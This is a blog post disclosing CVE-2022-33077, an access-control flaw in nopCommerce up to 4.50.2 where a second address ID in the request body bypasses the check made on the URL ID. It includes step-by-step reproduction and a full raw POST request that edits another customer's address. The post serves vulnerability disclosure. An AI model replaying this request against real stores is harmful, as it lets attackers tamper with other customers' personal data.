=== Content from medium.com_0b62315b_20250114_194818.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F2fa4bc763cc6&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40rohan_pagey%2Fcve-2022-33077-idor-to-change-address-of-any-customer-via-parameter-pollution-in-nopcommerce-4-5-2fa4bc763cc6&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40rohan_pagey%2Fcve-2022-33077-idor-to-change-address-of-any-customer-via-parameter-pollution-in-nopcommerce-4-5-2fa4bc763cc6&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2022–33077: IDOR to change address of any customer via parameter pollution in nopCommerce <= 4.50.2

[![Rohan Pagey](https://miro.medium.com/v2/resize:fill:88:88/0*cfNJubjraQR7dBv-.)](/%40rohan_pagey?source=post_page---byline--2fa4bc763cc6--------------------------------)

[Rohan Pagey](/%40rohan_pagey?source=post_page---byline--2fa4bc763cc6--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F92c852454dd6&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40rohan_pagey%2Fcve-2022-33077-idor-to-change-address-of-any-customer-via-parameter-pollution-in-nopcommerce-4-5-2fa4bc763cc6&user=Rohan+Pagey&userId=92c852454dd6&source=post_page-92c852454dd6--byline--2fa4bc763cc6---------------------post_header-----------)

2 min read·Oct 14, 2022

--

Listen

Share

TL;DR: A POST request to edit the address endpoint involved two addressID parameters (one in the URL and other in the request body). Validation was present on the parameter present in URL, while the parameter in request body was used to update a customer’s address.

## Description

There is an access control vulnerability affecting nopCommerce (≤ 4.50.2) and also affecting the upcoming beta version (4.60). The vulnerability lies in the “addressedit” endpoint, and a malicious customer can modify addresses of other users on the site.

## Proof of concept

1. Register 2 customers (C1 and C2) and add addresses (A1 and A2) for both of them respectively.
2. Note down the address Id of both the created addresses (let it be A1\_ID and A2\_ID). We will now login as C1 and modify A2.
3. Login as C1 and capture the POST request to edit your address as shown below. I’ve highlighted 4 parameters that you need to replace.

```
POST /customer/addressedit/<A1_ID> HTTP/2
Host: localhost
Cookie: <C1_Session_Cookies_Here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 506
Origin: <http://localhost>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailersAddress.Id=<A2_ID>&Address.FirstName=testing&Address.LastName=123&Address.Email=hello@hello.lcom&Address.Company=&Address.CountryId=211&Address.StateProvinceId=0&Address.City=sdv&Address.Address1=dsv&Address.Address2=&Address.ZipPostalCode=sdv&Address.PhoneNumber=12&Address.FaxNumber=&__RequestVerificationToken=<C1_CSRF_TOKEN_HERE>
```

Upon firing the above request with C1’s session tokens, the address of C2 will be updated. First the server is checking whether the addressID in the URL belongs to the Session token provided in the cookies, and then it is simply updating the address ID inside the POST request body. Logically, it should only update what it validates.

## Video POC

<https://www.youtube.com/watch?v=ccZxLXVdef0>

[Idor](/tag/idor?source=post_page-----2fa4bc763cc6--------------------------------)[Bug Bounty](/tag/bug-bounty?source=post_page-----2fa4bc763cc6--------------------------------)[Cve](/tag/cve?source=post_page-----2fa4bc763cc6--------------------------------)[Http Parameter Pollution](/tag/http-parameter-pollution?source=post_page-----2fa4bc763cc6--------------------------------)

--

--

[![Rohan Pagey](https://miro.medium.com/v2/resize:fill:96:96/0*cfNJubjraQR7dBv-.)](/%40rohan_pagey?source=post_page---post_author_info--2fa4bc763cc6--------------------------------)[![Rohan Pagey](https://miro.medium.com/v2/resize:fill:128:128/0*cfNJubjraQR7dBv-.)](/%40rohan_pagey?source=post_page---post_author_info--2fa4bc763cc6--------------------------------)Follow[## Written by Rohan Pagey](/%40rohan_pagey?source=post_page---post_author_info--2fa4bc763cc6--------------------------------)[21 Followers](/%40rohan_pagey/followers?source=post_page---post_author_info--2fa4bc763cc6--------------------------------)·[12 Following](/%40rohan_pagey/following?source=post_page---post_author_info--2fa4bc763cc6--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----2fa4bc763cc6--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----2fa4bc763cc6--------------------------------)[About](/about?autoplay=1&source=post_page-----2fa4bc763cc6--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----2fa4bc763cc6--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----2fa4bc763cc6--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----2fa4bc763cc6--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----2fa4bc763cc6--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----2fa4bc763cc6--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----2fa4bc763cc6--------------------------------)[Teams](/business?source=post_page-----2fa4bc763cc6--------------------------------)


